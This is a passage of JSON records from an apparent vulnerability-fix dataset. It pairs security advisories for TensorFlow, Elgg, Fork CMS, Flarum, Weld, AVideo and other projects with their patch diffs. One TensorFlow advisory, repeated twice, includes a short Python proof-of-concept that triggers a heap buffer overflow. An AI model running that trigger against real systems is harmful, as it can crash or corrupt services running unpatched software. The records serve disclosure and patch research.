'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0ab290774f91a23bebe30a358fde4e53ab4876a0'}","dataset":"osv","summary":"Heap buffer overflow in `BandedTriangularSolve` ### Impact\nAn attacker can trigger a heap buffer overflow in Eigen implementation of `tf.raw_ops.BandedTriangularSolve`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n  \nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)\nrhs_array = np.array([1,1])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)\ntf.raw_ops.BandedTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/eccb7ec454e6617738554a255d77f08e60ee0808\/tensorflow\/core\/kernels\/linalg\/banded_triangular_solve_op.cc#L269-L278) calls `ValidateInputTensors` for input validation but fails to validate that the two tensors are not empty:\n  \n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0, const Tensor& in1) {\n  OP_REQUIRES(\n      ctx, in0.dims() >= 2, \n      errors::InvalidArgument(\"In[0] ndims must be >= 2: \", in0.dims()));\n\n  OP_REQUIRES(\n      ctx, in1.dims() >= 2,\n      errors::InvalidArgument(\"In[1] ndims must be >= 2: \", in1.dims()));\n}\n``` \n\nFurthermore, since `OP_REQUIRES` macro only stops execution of current function after setting `ctx->status()` to a non-OK value, callers of helper functions that use `OP_REQUIRES` must check value of `ctx->status()` before continuing. This doesn't happen [in this op's implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/eccb7ec454e6617738554a255d77f08e60ee0808\/tensorflow\/core\/kernels\/linalg\/banded_triangular_solve_op.cc#L219), hence the validation that is present is also not effective.\n\n### Patches\nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [0ab290774f91a23bebe30a358fde4e53ab4876a0](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0ab290774f91a23bebe30a358fde4e53ab4876a0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2","commit_sha":"ba6822bd7b7324ba201a28b2f278c29a98edbef2","patch":"MULTI","chain_ord":"['ba6822bd7b7324ba201a28b2f278c29a98edbef2', '0ab290774f91a23bebe30a358fde4e53ab4876a0']","before_first_fix_commit":"{'327ef310be67923824814e85e13007e9699f4e0d'}","last_fix_commit":"0ab290774f91a23bebe30a358fde4e53ab4876a0","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 23:06:54","message":"Fix OOB issue with `tf.raw_ops.SparseSparseMinimum`.\n\nPiperOrigin-RevId: 371005787\nChange-Id: Ib686ccc077836e8b980b8b5a03936d36a8ecaf71","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ba6822bd7b7324ba201a28b2f278c29a98edbef2\/tensorflow%2Fcore%2Fkernels%2Fsparse_sparse_binary_op_shared.cc', 'patch': '@@ -180,6 +180,11 @@ class SparseSparseBinaryOpShared : public OpKernel {\\n                                           \" for dimension \", i));\\n     }\\n \\n+    OP_REQUIRES(\\n+        ctx, a_indices_t->dim_size(1) == b_indices_t->dim_size(1),\\n+        errors::InvalidArgument(\\n+            \"Indices\\' dimensions do not match: got \", a_indices_t->dim_size(1),\\n+            \" and \", b_indices_t->dim_size(1), \" for the second dimension.\"));\\n     const int num_dims = a_indices_t->dim_size(1);\\n     const auto a_indices_mat = a_indices_t->matrix<int64>();\\n     const auto b_indices_mat = b_indices_t->matrix<int64>();'}}","message_norm":"fix oob issue with `tf.raw_ops.sparsesparseminimum`.\n\npiperorigin-revid: 371005787\nchange-id: ib686ccc077836e8b980b8b5a03936d36a8ecaf71","language":"en","entities":"[('fix', 'ACTION', ''), ('oob', 'SECWORD', ''), ('issue', 'FLAW', ''), ('371005787', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc'])","num_files":1.0},{"index":164,"vuln_id":"GHSA-2xgj-xhgf-ggjv","cwe_id":"{'CWE-120'}","score":3.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0ab290774f91a23bebe30a358fde4e53ab4876a0'}","dataset":"osv","summary":"Heap buffer overflow in `BandedTriangularSolve` ### Impact\nAn attacker can trigger a heap buffer overflow in Eigen implementation of `tf.raw_ops.BandedTriangularSolve`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n  \nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)\nrhs_array = np.array([1,1])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)\ntf.raw_ops.BandedTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/eccb7ec454e6617738554a255d77f08e60ee0808\/tensorflow\/core\/kernels\/linalg\/banded_triangular_solve_op.cc#L269-L278) calls `ValidateInputTensors` for input validation but fails to validate that the two tensors are not empty:\n  \n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0, const Tensor& in1) {\n  OP_REQUIRES(\n      ctx, in0.dims() >= 2, \n      errors::InvalidArgument(\"In[0] ndims must be >= 2: \", in0.dims()));\n\n  OP_REQUIRES(\n      ctx, in1.dims() >= 2,\n      errors::InvalidArgument(\"In[1] ndims must be >= 2: \", in1.dims()));\n}\n``` \n\nFurthermore, since `OP_REQUIRES` macro only stops execution of current function after setting `ctx->status()` to a non-OK value, callers of helper functions that use `OP_REQUIRES` must check value of `ctx->status()` before continuing. This doesn't happen [in this op's implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/eccb7ec454e6617738554a255d77f08e60ee0808\/tensorflow\/core\/kernels\/linalg\/banded_triangular_solve_op.cc#L219), hence the validation that is present is also not effective.\n\n### Patches\nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [0ab290774f91a23bebe30a358fde4e53ab4876a0](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0ab290774f91a23bebe30a358fde4e53ab4876a0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0ab290774f91a23bebe30a358fde4e53ab4876a0","commit_sha":"0ab290774f91a23bebe30a358fde4e53ab4876a0","patch":"MULTI","chain_ord":"['ba6822bd7b7324ba201a28b2f278c29a98edbef2', '0ab290774f91a23bebe30a358fde4e53ab4876a0']","before_first_fix_commit":"{'327ef310be67923824814e85e13007e9699f4e0d'}","last_fix_commit":"0ab290774f91a23bebe30a358fde4e53ab4876a0","chain_ord_pos":2.0,"commit_datetime":"05\/12\/2021, 01:36:43","message":"Ensure validation sticks in banded_triangular_solve_op\n\nPiperOrigin-RevId: 373275480\nChange-Id: Id7717cf275b2d6fdb9441fbbe166d555182d2e79","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/core\/kernels\/linalg\/banded_triangular_solve_op.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0ab290774f91a23bebe30a358fde4e53ab4876a0\/tensorflow%2Fcore%2Fkernels%2Flinalg%2Fbanded_triangular_solve_op.cc', 'patch': '@@ -217,6 +217,7 @@ class BandedTriangularSolveOpCpu : public OpKernel {\\n     const Tensor& in1 = ctx->input(1);\\n \\n     ValidateInputTensors(ctx, in0, in1);\\n+    if (!ctx->status().ok()) return;\\n \\n     MatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());\\n     OP_REQUIRES('}}","message_norm":"ensure validation sticks in banded_triangular_solve_op\n\npiperorigin-revid: 373275480\nchange-id: id7717cf275b2d6fdb9441fbbe166d555182d2e79","language":"en","entities":"[('ensure', 'ACTION', ''), ('373275480', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/linalg\/banded_triangular_solve_op.cc'])","num_files":1.0},{"index":169,"vuln_id":"GHSA-2xw8-j43j-5vxp","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/elgg\/elgg\/commit\/c30b17bf75256ed3fcc84e2083147cc3951423d0'}","dataset":"osv","summary":"elgg is vulnerable to Cross-site Scripting elgg is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/elgg\/elgg","commit_href":"https:\/\/github.com\/elgg\/elgg\/commit\/c30b17bf75256ed3fcc84e2083147cc3951423d0","commit_sha":"c30b17bf75256ed3fcc84e2083147cc3951423d0","patch":"SINGLE","chain_ord":"['c30b17bf75256ed3fcc84e2083147cc3951423d0']","before_first_fix_commit":"{'ea72485b6a08f30f452b8e5425310f2b3546050c'}","last_fix_commit":"c30b17bf75256ed3fcc84e2083147cc3951423d0","chain_ord_pos":1.0,"commit_datetime":"12\/06\/2021, 14:39:10","message":"fix(reported_content): sanitize report URLs","author":"Jer\u00f4me Bakker","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'mod\/reportedcontent\/actions\/reportedcontent\/add.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Elgg\/Elgg\/raw\/c30b17bf75256ed3fcc84e2083147cc3951423d0\/mod%2Freportedcontent%2Factions%2Freportedcontent%2Fadd.php', 'patch': '@@ -18,7 +18,7 @@\\n $report = new ElggReportedContent();\\n $report->owner_guid = elgg_get_logged_in_user_guid();\\n $report->title = $title;\\n-$report->address = $address;\\n+$report->address = elgg_normalize_site_url($address);\\n $report->description = $description;\\n $report->access_id = $access;'}}","message_norm":"fix(reported_content): sanitize report urls","language":"ro","entities":"[('fix(reported_content', 'ACTION', ''), ('sanitize', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['mod\/reportedcontent\/actions\/reportedcontent\/add.php'])","num_files":1.0},{"index":177,"vuln_id":"GHSA-32j9-6qqm-mq9g","cwe_id":"{'CWE-241', 'CWE-703'}","score":7.5,"chain":"{'https:\/\/github.com\/Venemo\/node-lmdb\/commit\/97760104c0fd311206b88aecd91fa1f59fe2b85a'}","dataset":"osv","summary":"Unhandled case in node-lmdb The package node-lmdb before 0.9.7 is vulnerable to Denial of Service (DoS) when defining a non-invokable `ToString` value, which will cause a crash during type check.","published_date":"2022-03-17","chain_len":1,"project":"https:\/\/github.com\/Venemo\/node-lmdb","commit_href":"https:\/\/github.com\/Venemo\/node-lmdb\/commit\/97760104c0fd311206b88aecd91fa1f59fe2b85a","commit_sha":"97760104c0fd311206b88aecd91fa1f59fe2b85a","patch":"SINGLE","chain_ord":"['97760104c0fd311206b88aecd91fa1f59fe2b85a']","before_first_fix_commit":"{'4b659d1734e02e09b45a29ac81f425f610bd14ea'}","last_fix_commit":"97760104c0fd311206b88aecd91fa1f59fe2b85a","chain_ord_pos":1.0,"commit_datetime":"03\/12\/2022, 14:19:20","message":"Perform argument check for putString","author":"Kris Zyp","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'src\/txn.cpp': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Venemo\/node-lmdb\/raw\/97760104c0fd311206b88aecd91fa1f59fe2b85a\/src%2Ftxn.cpp', 'patch': '@@ -295,6 +295,8 @@ Nan::NAN_METHOD_RETURN_TYPE TxnWrap::putCommon(Nan::NAN_METHOD_ARGS_TYPE info, v\\n }\\n \\n NAN_METHOD(TxnWrap::putString) {\\n+    if (!info[2]->IsString())\\n+        return Nan::ThrowError(\"Value must be a string.\");\\n     return putCommon(info, [](Nan::NAN_METHOD_ARGS_TYPE info, MDB_val &data) -> void {\\n         CustomExternalStringResource::writeTo(Local<String>::Cast(info[2]), &data);\\n     }, [](MDB_val &data) -> void {'}}","message_norm":"perform argument check for putstring","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/txn.cpp'])","num_files":1.0},{"index":180,"vuln_id":"GHSA-32wx-4gxx-h48f","cwe_id":"{'CWE-639'}","score":0.0,"chain":"{'https:\/\/github.com\/flarum\/tags\/commit\/c8fcd000857493f1e4cc00b6f2771ce388b93e9d'}","dataset":"osv","summary":"Users can edit the tags of any discussion This advisory concerns a vulnerability which was patched and publicly released on October 5, 2020.\n\n### Impact\nThis vulnerability allowed any registered user to edit the tags of any discussion for which they have READ access using the REST API.\n\nUsers were able to remove any existing tag, and add any tag in which they are allowed to create discussions. The chosen tags still had to match the configured Tags minimums and maximums.\n\nBy moving the discussion to new tags, users were able to go around permissions applied to restricted tags. Depending on the setup, this can include publicly exposing content that was only visible to certain groups, or gain the ability to interact with content where such interaction was limited.\n\nThe full impact varies depending on the configuration of permissions and restricted tags, and which community extensions are being used. All tag-scoped permissions offered by extensions are impacted by this ability to go around them.\n\nForums that don't use restricted tags and don't use any extension that relies on tags for access control should not see any security impact. An update is still required to stop users from being able to change any discussion's tags.\n\nForums that don't use the Tags extension are unaffected.\n\n### Patches\nThe fix will be available in version v0.1.0-beta.14 with Flarum beta 14. The fix has already been back-ported to Flarum beta 13 as version v0.1.0-beta.13.2 of the Tags extension.\n\n### Workarounds\nVersion v0.1.0-beta.13.2 of the Tags extension allows existing Flarum beta 13 forums to fix the issue without the need to update to beta 14.\n\nForums that have not yet updated to Flarum beta 13 are encouraged to update as soon as possible.\n\n### References\n\n- [Release announcement](https:\/\/discuss.flarum.org\/d\/25059-security-update-to-flarum-tags-010-beta132)\n- [GitHub issue](https:\/\/github.com\/flarum\/core\/issues\/2355)\n\n### For more information\nIf you have any questions or comments about this advisory, please start a new discussion on our [support forum](https:\/\/discuss.flarum.org\/t\/support).\n\nIf you discover a security vulnerability within Flarum, please send an e-mail to [security@flarum.org](mailto:security@flarum.org). All security vulnerabilities will be promptly addressed. More details can be found in our [security policy](https:\/\/github.com\/flarum\/core\/security\/policy).","published_date":"2021-01-29","chain_len":1,"project":"https:\/\/github.com\/flarum\/tags","commit_href":"https:\/\/github.com\/flarum\/tags\/commit\/c8fcd000857493f1e4cc00b6f2771ce388b93e9d","commit_sha":"c8fcd000857493f1e4cc00b6f2771ce388b93e9d","patch":"SINGLE","chain_ord":"['c8fcd000857493f1e4cc00b6f2771ce388b93e9d']","before_first_fix_commit":"{'c207faa17ffc496d5ce0161923f19556a0ac4c5b'}","last_fix_commit":"c8fcd000857493f1e4cc00b6f2771ce388b93e9d","chain_ord_pos":1.0,"commit_datetime":"10\/03\/2020, 22:37:56","message":"Fix Editing Discussion Tags Permission (#95)","author":"Sami Mazouz","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'src\/Listener\/SaveTagsToDatabase.php': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/flarum\/tags\/raw\/c8fcd000857493f1e4cc00b6f2771ce388b93e9d\/src%2FListener%2FSaveTagsToDatabase.php', 'patch': \"@@ -59,6 +59,10 @@ public function handle(Saving $event)\\n \\n         \/\/ TODO: clean up, prevent discussion from being created without tags\\n         if (isset($event->data['relationships']['tags']['data'])) {\\n+            if ($discussion->exists) {\\n+                $actor->assertCan('tag', $discussion);\\n+            }\\n+\\n             $linkage = (array) $event->data['relationships']['tags']['data'];\\n \\n             $newTagIds = [];\"}}","message_norm":"fix editing discussion tags permission (#95)","language":"en","entities":"[('fix', 'ACTION', ''), ('permission', 'SECWORD', ''), ('#95', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Listener\/SaveTagsToDatabase.php'])","num_files":1.0},{"index":187,"vuln_id":"GHSA-3374-7h99-xr85","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/forkcms\/forkcms\/commit\/6ec6171206a7507a39695edc8bbd1b97ef1041c6'}","dataset":"osv","summary":"Cross-site scripting in forkcms Fork CMS Content Management System v5.8.0 was discovered to contain a cross-site scripting (XSS) vulnerability in the `Displayname` field when using the `Add`, `Edit` or `Register' functions. This vulnerability allows attackers to execute arbitrary web scripts or HTML.","published_date":"2021-10-25","chain_len":1,"project":"https:\/\/github.com\/forkcms\/forkcms","commit_href":"https:\/\/github.com\/forkcms\/forkcms\/commit\/6ec6171206a7507a39695edc8bbd1b97ef1041c6","commit_sha":"6ec6171206a7507a39695edc8bbd1b97ef1041c6","patch":"SINGLE","chain_ord":"['6ec6171206a7507a39695edc8bbd1b97ef1041c6']","before_first_fix_commit":"{'f439d630c2f46a85b251488cd7073068a66fae5c'}","last_fix_commit":"6ec6171206a7507a39695edc8bbd1b97ef1041c6","chain_ord_pos":1.0,"commit_datetime":"04\/17\/2020, 10:44:12","message":"Fix xss in profiles display name","author":"Jelmer Prins","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'src\/Backend\/Modules\/Profiles\/Actions\/Index.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/forkcms\/forkcms\/raw\/6ec6171206a7507a39695edc8bbd1b97ef1041c6\/src%2FBackend%2FModules%2FProfiles%2FActions%2FIndex.php', 'patch': \"@@ -128,6 +128,7 @@ private function loadDataGrid(): void\\n             'registered_on',\\n             true\\n         );\\n+        $this->dgProfiles->setColumnFunction('htmlspecialchars', ['[display_name]'], 'display_name');\\n \\n         \/\/ add the mass action controls\\n         $this->dgProfiles->setMassActionCheckboxes('check', '[id]');\"}}","message_norm":"fix xss in profiles display name","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Backend\/Modules\/Profiles\/Actions\/Index.php'])","num_files":1.0},{"index":188,"vuln_id":"GHSA-338v-3958-8v8r","cwe_id":"{'CWE-362'}","score":0.0,"chain":"{'https:\/\/github.com\/weld\/core\/commit\/6808b11cd6d97c71a2eed754ed4f955acd789086', 'https:\/\/github.com\/weld\/core\/commit\/29fd1107fd30579ad9bb23fae4dc3ba464205745', 'https:\/\/github.com\/weld\/core\/commit\/8e413202fa1af08c09c580f444e4fd16874f9c65'}","dataset":"osv","summary":"Information disclosure in JBoss Weld Race condition in JBoss Weld before 2.2.8 and 3.x before 3.0.0 Alpha3 allows remote attackers to obtain information from a previous conversation via vectors related to a stale thread state.","published_date":"2020-06-10","chain_len":3,"project":"https:\/\/github.com\/weld\/core","commit_href":"https:\/\/github.com\/weld\/core\/commit\/6808b11cd6d97c71a2eed754ed4f955acd789086","commit_sha":"6808b11cd6d97c71a2eed754ed4f955acd789086","patch":"MULTI","chain_ord":"['29fd1107fd30579ad9bb23fae4dc3ba464205745', '6808b11cd6d97c71a2eed754ed4f955acd789086', '8e413202fa1af08c09c580f444e4fd16874f9c65']","before_first_fix_commit":"{'6808b11cd6d97c71a2eed754ed4f955acd789086'}","last_fix_commit":"8e413202fa1af08c09c580f444e4fd16874f9c65","chain_ord_pos":2.0,"commit_datetime":"12\/01\/2014, 16:48:56","message":"WELD-1802 RequestScopedCache - Make sure each request is ended before a new one is started","author":"Jozef Hartinger","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'impl\/src\/main\/java\/org\/jboss\/weld\/context\/cache\/RequestScopedCache.java': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/weld\/core\/raw\/6808b11cd6d97c71a2eed754ed4f955acd789086\/impl%2Fsrc%2Fmain%2Fjava%2Forg%2Fjboss%2Fweld%2Fcontext%2Fcache%2FRequestScopedCache.java', 'patch': '@@ -71,6 +71,8 @@ public void invalidate() {\\n     }\\n \\n     public static void beginRequest() {\\n+        \/\/ if the previous request was not ended properly for some reason, make sure it is ended now\\n+        endRequest();\\n         CACHE.set(new LinkedList<RequestScopedItem>());\\n     }\\n \\n@@ -80,8 +82,8 @@ public static void beginRequest() {\\n      *\/\\n     public static void endRequest() {\\n         final List<RequestScopedItem> result = CACHE.get();\\n-        CACHE.remove();\\n         if (result != null) {\\n+            CACHE.remove();\\n             for (final RequestScopedItem item : result) {\\n                 item.invalidate();\\n             }'}}","message_norm":"weld-1802 requestscopedcache - make sure each request is ended before a new one is started","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['impl\/src\/main\/java\/org\/jboss\/weld\/context\/cache\/RequestScopedCache.java'])","num_files":1.0},{"index":196,"vuln_id":"GHSA-34hv-f45p-4qfq","cwe_id":"{'CWE-601'}","score":6.1,"chain":"{'https:\/\/github.com\/WWBN\/AVideo\/commit\/77e9aa6411ff4b97571eb82e587139ec05ff894c'}","dataset":"osv","summary":"Open redirect in wwbn\/avideo Open redirect vulnerability in objects\/login.json.php in WWBN AVideo through 11.6, allows attackers to arbitrarily redirect users from a crafted url to the login page. A patch is available on the `master` branch of the repository.","published_date":"2022-04-06","chain_len":1,"project":"https:\/\/github.com\/WWBN\/AVideo","commit_href":"https:\/\/github.com\/WWBN\/AVideo\/commit\/77e9aa6411ff4b97571eb82e587139ec05ff894c","commit_sha":"77e9aa6411ff4b97571eb82e587139ec05ff894c","patch":"SINGLE","chain_ord":"['77e9aa6411ff4b97571eb82e587139ec05ff894c']","before_first_fix_commit":"{'24a25e4f415be8146c89f04df32ba4acce1b0e80'}","last_fix_commit":"77e9aa6411ff4b97571eb82e587139ec05ff894c","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 17:54:12","message":"Open Redirect fix, thanks Max Boll","author":"Daniel","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'objects\/login.json.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/WWBN\/AVideo\/raw\/77e9aa6411ff4b97571eb82e587139ec05ff894c\/objects%2Flogin.json.php', 'patch': '@@ -30,7 +30,7 @@\\n Category::clearCacheCount();\\n TimeLogEnd($timeLog, __LINE__);\\n \\n-if (!preg_match(\"|^\" . $global[\\'webSiteRootURL\\'] . \"|\", $_POST[\\'redirectUri\\'])) {\\n+if(!isSameDomain($global[\\'webSiteRootURL\\'], $_POST[\\'redirectUri\\'])){\\n     $_POST[\\'redirectUri\\'] = $global[\\'webSiteRootURL\\'];\\n }\\n _error_log(\"Start Login Request redirectUri=\" . $_POST[\\'redirectUri\\']);'}}","message_norm":"open redirect fix, thanks max boll","language":"en","entities":"[('open redirect', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['objects\/login.json.php'])","num_files":1.0},{"index":200,"vuln_id":"GHSA-35g4-qx3c-vjhx","cwe_id":"{'CWE-306'}","score":6.5,"chain":"{'https:\/\/github.com\/matrix-org\/matrix-appservice-bridge\/commit\/b69e745584a34fcfd858df33e4631e420da07b9f'}","dataset":"osv","summary":"Automatic room upgrade handling can be used maliciously to bridge a room non-consentually  ### Impact\n\nIf a bridge has room upgrade handling turned on in the configuration (the `roomUpgradeOpts` key when instantiating a new `Bridge` instance.), any `m.room.tombstone` event it encounters will be used to unbridge the current room and bridge into the target room. However, the target room `m.room.create` event is not checked to verify if the `predecessor` field contains the previous room. This means that any mailcious admin of a bridged room can repoint the traffic to a different room without the new room being aware.\n\n\n### Patches\n\nVersions 2.6.1 and greater are patched.\n\n### Workarounds\n\nDisabling the automatic room upgrade handling can be done by removing the `roomUpgradeOpts` key from the `Bridge` class options. \n\n### References\n\nThe issue is patched by https:\/\/github.com\/matrix-org\/matrix-appservice-bridge\/pull\/330\n\n### For more information]\n\nIf you have any questions or comments about this advisory, email us at security@matrix.org.","published_date":"2021-06-21","chain_len":1,"project":"https:\/\/github.com\/matrix-org\/matrix-appservice-bridge","commit_href":"https:\/\/github.com\/matrix-org\/matrix-appservice-bridge\/commit\/b69e745584a34fcfd858df33e4631e420da07b9f","commit_sha":"b69e745584a34fcfd858df33e4631e420da07b9f","patch":"SINGLE","chain_ord":"['b69e745584a34fcfd858df33e4631e420da07b9f']","before_first_fix_commit":"{'1b587e2455cbd30779f5052d2d2d46d58463a3e2'}","last_fix_commit":"b69e745584a34fcfd858df33e4631e420da07b9f","chain_ord_pos":1.0,"commit_datetime":"05\/28\/2021, 09:32:25","message":"Check m.room.create event on room upgrade","author":"Will Hunt","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'src\/components\/room-upgrade-handler.ts': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/matrix-org\/matrix-appservice-bridge\/raw\/b69e745584a34fcfd858df33e4631e420da07b9f\/src%2Fcomponents%2Froom-upgrade-handler.ts', 'patch': \"@@ -145,6 +145,13 @@ export class RoomUpgradeHandler {\\n     private async onJoinedNewRoom(oldRoomId: string, newRoomId: string) {\\n         log.debug(`Joined ${newRoomId}`);\\n         const intent = this.bridge.getIntent();\\n+        const { predecessor } = await intent.getStateEvent(newRoomId, 'm.room.create');\\n+        if (predecessor.room_id !== oldRoomId) {\\n+            log.error(\\n+    `Room doesn't have a matching predecessor (expected: ${oldRoomId}, got: ${predecessor.room_id}), not bridging.`\\n+            );\\n+            return false;\\n+        }\\n         const asBot = this.bridge.getBot();\\n         if (this.opts.migrateStoreEntries) {\\n             const success = await this.migrateStoreEntries(oldRoomId, newRoomId);\"}}","message_norm":"check m.room.create event on room upgrade","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/components\/room-upgrade-handler.ts'])","num_files":1.0},{"index":202,"vuln_id":"GHSA-35m5-8cvj-8783","cwe_id":"{'CWE-916', 'CWE-327', 'CWE-328'}","score":7.5,"chain":"{'https:\/\/github.com\/Morgan-Phoenix\/EnroCrypt\/commit\/e652d56ac60eadfc26489ab83927af13a9b9d8ce'}","dataset":"osv","summary":"Improper hashing in enrocrypt ### Impact\nThe vulnerability is we used MD5 hashing Algorithm In our hashing file. If anyone who is a beginner(and doesn't know about hashes)  can face problems as MD5 is considered a Insecure Hashing Algorithm. \n\n### Patches\nThe vulnerability is patched in v1.1.4 of the product, the users can upgrade to version 1.1.4.\n\n### Workarounds\nIf u specifically want a version and don't want to upgrade, you can remove the `MD5` hashing function from the file `hashing.py` and this vulnerability will be gone\n\n### References\nhttps:\/\/www.cybersecurity-help.cz\/vdb\/cwe\/916\/\nhttps:\/\/www.cybersecurity-help.cz\/vdb\/cwe\/327\/\nhttps:\/\/www.cybersecurity-help.cz\/vdb\/cwe\/328\/\nhttps:\/\/www.section.io\/engineering-education\/what-is-md5\/\nhttps:\/\/www.johndcook.com\/blog\/2019\/01\/24\/reversing-an-md5-hash\/\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [**Enrocrypt's Official Repo**](http:\/\/www.github.com\/Morgan-Phoenix\/EnroCrypt)\n* Create a Discussion in  [**Enrocrypt's Official Repo**](http:\/\/www.github.com\/Morgan-Phoenix\/EnroCrypt)","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/Morgan-Phoenix\/EnroCrypt","commit_href":"https:\/\/github.com\/Morgan-Phoenix\/EnroCrypt\/commit\/e652d56ac60eadfc26489ab83927af13a9b9d8ce","commit_sha":"e652d56ac60eadfc26489ab83927af13a9b9d8ce","patch":"SINGLE","chain_ord":"['e652d56ac60eadfc26489ab83927af13a9b9d8ce']","before_first_fix_commit":"{'d02050267cecbe4f2877a07ca8a930129528ac05'}","last_fix_commit":"e652d56ac60eadfc26489ab83927af13a9b9d8ce","chain_ord_pos":1.0,"commit_datetime":"11\/06\/2021, 14:04:45","message":"Fixed GHSA-35m5-8cvj-8783","author":"Morgan-Phoenix","comments":null,"stats":"{'additions': 0, 